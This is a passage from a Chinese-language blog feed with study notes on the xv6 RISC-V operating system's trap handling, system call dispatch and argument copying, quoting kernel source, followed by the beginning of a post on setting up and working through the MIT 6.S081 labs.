class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">.globl uservec</span><br><span class="line">uservec:    </span><br><span class="line">        <span class="meta"># trap.c sets stvec to point here, so</span></span><br><span class="line">        <span class="meta"># traps from user space start here,</span></span><br><span class="line">        <span class="meta"># in supervisor mode, but with a</span></span><br><span class="line">        <span class="meta"># user page table.</span></span><br><span class="line">        #</span><br><span class="line">        <span class="meta"># sscratch points to where the process<span class="meta-string">&#x27;s p-&gt;trapframe is</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # mapped into user space, at TRAPFRAME.</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        #</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        </span></span></span><br><span class="line"><span class="meta-string"><span class="meta"># swap a0 and sscratch</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # so that a0 is TRAPFRAME</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrrw a0, sscratch, a0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # save the user registers in TRAPFRAME</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd ra, 40(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd sp, 48(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd gp, 56(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd tp, 64(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t0, 72(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t1, 80(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t2, 88(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s0, 96(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s1, 104(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a1, 120(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a2, 128(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a3, 136(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a4, 144(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a5, 152(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a6, 160(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a7, 168(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s2, 176(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s3, 184(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s4, 192(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s5, 200(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s6, 208(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s7, 216(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s8, 224(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s9, 232(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s10, 240(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s11, 248(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t3, 256(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t4, 264(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t5, 272(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t6, 280(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"># save the user a0 in p-&gt;trapframe-&gt;a0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrr t0, sscratch</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t0, 112(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # restore kernel stack pointer from p-&gt;trapframe-&gt;kernel_sp</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld sp, 8(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld tp, 32(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # load the address of usertrap(), p-&gt;trapframe-&gt;kernel_trap</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld t0, 16(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # restore kernel page table from p-&gt;trapframe-&gt;kernel_satp</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld t1, 0(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrw satp, t1</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sfence.vma zero, zero</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # a0 is no longer valid, since the kernel page</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # table does not specially map p-&gt;tf.</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # jump to usertrap(), which does not return</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        jr t0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br></pre></td></tr></table></figure><p><code>uservec</code>启动时，所有32个寄存器都包含被中断代码所拥有的值。</p><p><code>uservec</code>开始时的<code>csrrw</code>指令交换了<code>a0</code>和<code>sscratch</code>的内容。现在用户代码的<code>a0</code>被保存了；<code>uservec</code>有一个寄存器（<code>a0</code>）可以使用；<code>a0</code>包含内核以前放在<code>sscratch</code>中的值。</p><blockquote><p>这块先过，，，有点跟不懂</p></blockquote><h2 id="调用系统调用">4.3 调用系统调用</h2><p>第二章的时候<strong>initcode.S</strong>调用<code>exec</code>系统调用后，看看用户调用是如何在内核中实现<code>exec</code>系统调用的。</p><p>用户代码将<code>exec</code>需要的参数放在寄存器<code>a0</code>和<code>a1</code>中，并将系统调用号放在<code>a7</code>中。</p><p><code>ecall</code>指令陷入(trap)到内核中，执行<code>uservec</code>、<code>usertrap</code>和<code>syscall</code>，和<span class="math inline">\((4.2)\)</span>步骤一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">num = p-&gt;trapframe-&gt;a7;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">   p-&gt;pid, p-&gt;name, num);</span><br><span class="line">p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syscall</code>首先从陷阱帧(trapframe)中保存的a7检索系统调用号，并用它索引到<code>syscalls</code>中，对于第一次系统调用，<code>a7</code>中的内容是<code>SYS_exec</code>（<strong>kernel/syscall. h</strong>），导致了对系统调用接口函数<code>sys_exec</code>的调用。</p><p>当系统调用接口函数返回时，<code>syscall</code>将其返回值记录在<code>p-&gt;trapframe-&gt;a0</code>中。这将导致原始用户空间对<code>exec()</code>的调用返回该值，因为RISC-V上的C调用约定将返回值放在<code>a0</code>中。系统调用通常返回负数表示错误，返回零或正数表示成功。如果系统调用号无效，<code>syscall</code>打印错误并返回-1。</p><h2 id="系统调用参数">4.4 系统调用参数</h2><p>函数<code>artint</code>、<code>artaddr</code>和<code>artfd</code>从陷阱框架中检索第n个<strong>系统调用参数</strong>并以整数、指针或文件描述符的形式保存。他们都调用<code>argraw</code>来检索相应的保存的用户寄存器（<strong>kernel/syscall.c</strong>）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fetch the nth 32-bit system call argument.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argint</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*ip = argraw(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Retrieve an argument as a pointer.</span></span><br><span class="line"><span class="comment">// Doesn&#x27;t check for legality, since</span></span><br><span class="line"><span class="comment">// copyin/copyout will do that.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*ip = argraw(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the nth word-sized system call argument as a null-terminated string.</span></span><br><span class="line"><span class="comment">// Copies into buf, at most max.</span></span><br><span class="line"><span class="comment">// Returns string length if OK (including nul), -1 if error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argstr</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 addr;</span><br><span class="line"><span class="keyword">if</span> (argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64</span></span><br><span class="line"><span class="function"><span class="title">argraw</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"><span class="keyword">switch</span> (n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a0;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a1;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a2;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a3;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a4;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a5;</span><br><span class="line">&#125;</span><br><span class="line">panic(<span class="string">&quot;argraw&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内核实现了安全地将数据传输到用户提供的地址和从用户提供的地址传输数据的功能。<code>fetchstr</code>是一个例子（<strong>kernel/syscall.c</strong>）。文件系统调用，如<code>exec</code>，使用<code>fetchstr</code>从用户空间检索字符串文件名参数。<code>fetchstr</code>调用<code>copyinstr</code>来完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fetch the nul-terminated string at addr from the current process.</span></span><br><span class="line"><span class="comment">// Returns length of string, not including nul, or -1 for error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fetchstr</span><span class="params">(uint64 addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"><span class="keyword">int</span> err = copyinstr(p-&gt;pagetable, buf, addr, max);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strlen</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copyinstr</code>（<strong>kernel/vm.c</strong>）从用户页表页表中的虚拟地址<code>srcva</code>复制<code>max</code>字节到<code>dst</code>。又调用<code>walk</code>遍历页表，以确定<code>srcva</code>的物理地址<code>pa0</code>。由于内核将所有物理RAM地址映射到同一个内核虚拟地址，<code>copyinstr</code>可以直接将字符串字节从<code>pa0</code>复制到<code>dst</code>。<code>walkaddr</code>（<strong>kernel/vm.c</strong>）检查用户提供的虚拟地址是否为进程用户地址空间的一部分，因此程序不能欺骗内核读取其他内存。一个类似的函数<code>copyout</code>，将数据从内核复制到用户提供的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy a null-terminated string from user to kernel.</span></span><br><span class="line"><span class="comment">// Copy bytes to dst from virtual address srcva in a given page table,</span></span><br><span class="line"><span class="comment">// until a &#x27;\0&#x27;, or max.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copyinstr</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 n, va0, pa0;</span><br><span class="line"><span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">va0 = PGROUNDDOWN(srcva);</span><br><span class="line">pa0 = walkaddr(pagetable, va0);</span><br><span class="line"><span class="keyword">if</span> (pa0 == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">n = PGSIZE - (srcva - va0);</span><br><span class="line"><span class="keyword">if</span> (n &gt; max)</span><br><span class="line">n = max;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)(pa0 + (srcva - va0));</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">*dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">got_null = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*dst = *p;</span><br><span class="line">&#125;</span><br><span class="line">--n;</span><br><span class="line">--max;</span><br><span class="line">p++;</span><br><span class="line">dst++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">srcva = va0 + PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (got_null)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="从内核空间陷入">4.5 从内核空间陷入</h2><p>xv6根据执行的是用户代码还是内核代码，对CPU陷阱寄存器的配置有所不同。当在CPU上执行内核时，内核将<code>stvec</code>指向<code>kernelvec</code>(<strong>kernel/kernelvec.S</strong>)的汇编代码。由于xv6已经在内核中，<code>kernelvec</code>可以依赖于设置为内核页表的<code>satp</code>，以及指向有效内核栈的栈指针。</p><p><code>Kernelvec</code>在保存寄存器后跳转到<code>kerneltrap</code>(<strong>kernel/trap.c</strong>)。为两种类型的陷阱做好了准备：设备中断和异常。调用<code>devintr</code>(<strong>kernel/trap.c</strong>)来检查和处理中断。如果陷阱不是设备中断，则必定是一个异常，内核中的异常将是一个致命的错误；内核调用<code>panic</code>并停止执行。</p><p>如果由于计时器中断而调用了<code>kerneltrap</code>，并且一个进程的内核线程正在运行（而不是调度程序线程），<code>kerneltrap</code>会调用<code>yield</code>，给其他线程一个运行的机会。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// interrupts and exceptions from kernel code go here via kernelvec,</span></span><br><span class="line"><span class="comment">// on whatever the current kernel stack is.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">uint64 sepc = r_sepc();</span><br><span class="line">uint64 sstatus = r_sstatus();</span><br><span class="line">uint64 scause = r_scause();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intr_get() != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((which_dev = devintr()) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span> (which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">yield();</span><br><span class="line"></span><br><span class="line"><span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line"><span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">w_sepc(sepc);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kerneltrap</code>完成后，返回到任何被陷阱中断的代码。恢复这些控制寄存器并返回到<code>kernelvec</code>(<strong>kernel/kernelvec.S</strong>)，之后<code>sret</code>，将<code>sepc</code>复制到<code>pc</code>并恢复中断的内核代码。</p><h1 id="chapter-5interrupts-and-device-drivers">Chapter 5:Interrupts and device drivers</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;英文版：https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf&lt;/p&gt;
&lt;p&gt;中文版：http://xv6.dgs.zone/&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6S081lab</title>
    <link href="https://ghostasky.github.io/2022/07/10/2022-7-10-oslab/"/>
    <id>https://ghostasky.github.io/2022/07/10/2022-7-10-oslab/</id>
    <published>2022-07-09T16:00:00.000Z</published>
    <updated>2022-07-21T13:31:27.218Z</updated>
    
    <content type="html"><![CDATA[<p>写oslab的一些代码，</p><blockquote><p>xv6中文文档：https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html</p></blockquote><p>[toc]</p><h1 id="进度">进度</h1><p>进度：</p><table><thead><tr class="header"><th style="text-align: left;">lab_num/lab_name</th><th style="text-align: left;">Is it completed</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Lab1/sleep</td><td style="text-align: left;">Finish</td></tr><tr class="even"><td style="text-align: left;">Lab1/pingpong</td><td style="text-align: left;">Finish</td></tr><tr class="odd"><td style="text-align: left;">Lab1/prime</td><td style="text-align: left;">Finish</td></tr><tr class="even"><td style="text-align: left;">Lab1/find</td><td style="text-align: left;"></td></tr><tr class="odd"><td style="text-align: left;">Lab1/xargs</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: left;">Lab2/trace</td><td style="text-align: left;">Finish</td></tr><tr class="odd"><td style="text-align: left;">Lab2/sysinfo</td><td style="text-align: left;">Finish</td></tr><tr class="even"><td style="text-align: left;">Lab3/vmprint</td><td style="text-align: left;">Finish</td></tr></tbody></table><h1 id="环境">环境</h1><p>之前搞到一半，，环境有点问题，想着重新搞个虚拟机写os的lab</p><p>依赖，源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu </span><br><span class="line"></span><br><span class="line">sudo apt-get remove qemu-system-misc</span><br><span class="line">sudo apt-get install qemu-system-misc=1:4.2-3ubuntu6</span><br><span class="line">sudo apt install gcc-riscv64-unknown-elf</span><br><span class="line">git clone git://g.csail.mit.edu/xv6-labs-2020</span><br></pre></td></tr></table></figure><p>有如下分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ git branch  --remote</span><br><span class="line">  origin/HEAD -&gt; origin/master</span><br><span class="line">  origin/cow</span><br><span class="line">  origin/fs</span><br><span class="line">  origin/lazy</span><br><span class="line">  origin/lock</span><br><span class="line">  origin/master</span><br><span class="line">  origin/mmap</span><br><span class="line">  origin/net</span><br><span class="line">  origin/pgtbl</span><br><span class="line">  origin/riscv</span><br><span class="line">  origin/syscall</span><br><span class="line">  origin/thread</span><br><span class="line">  origin/traps</span><br><span class="line">  origin/util</span><br></pre></td></tr></table></figure><p>调试的话要在Makefile里加：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">gdb:</span></span><br><span class="line">riscv64-unknown-elf-gdb kernel/kernel</span><br></pre></td></tr></table></figure><p>调试的话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  kernel/kernel</span><br><span class="line">make qemu-gdb</span><br></pre></td></tr></table></figure><p>评测脚本grade-lab-util是python程序，这里对第一行进行修改，将</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"><span class="comment">#!/usr/bin python</span></span><br></pre></td></tr></table></figure><p>还要再Makefile里面加。</p><h2 id="分支建议">分支建议：</h2><p>(6). <strong>xv6实验git分支建议</strong></p><p>建议是每个实验创建一个测试分支，例如对于<strong>util</strong>来说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 